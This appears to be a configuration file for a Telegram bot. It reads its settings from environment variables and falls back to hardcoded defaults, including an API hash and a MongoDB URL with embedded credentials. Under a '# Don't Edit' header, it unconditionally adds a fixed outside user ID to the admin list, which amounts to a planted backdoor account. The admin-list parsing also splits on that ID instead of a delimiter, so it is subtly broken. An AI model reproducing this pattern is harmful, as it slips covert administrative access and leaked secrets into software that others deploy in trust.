# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "22525529"))
API_HASH = os.environ.get("API_HASH", "840111f82bbd1d2d3de5055afccf6a92")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "Bot Token")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("5450011131")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "Bot")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://Bot:Bot@cluster0.s0ppb5z.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "5450011131")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(5450011131)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "-1001790068959")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "CrazyXBoTs") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", 'https://te.legra.ph/file/b2ddddf654411d50192c6.jpg') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
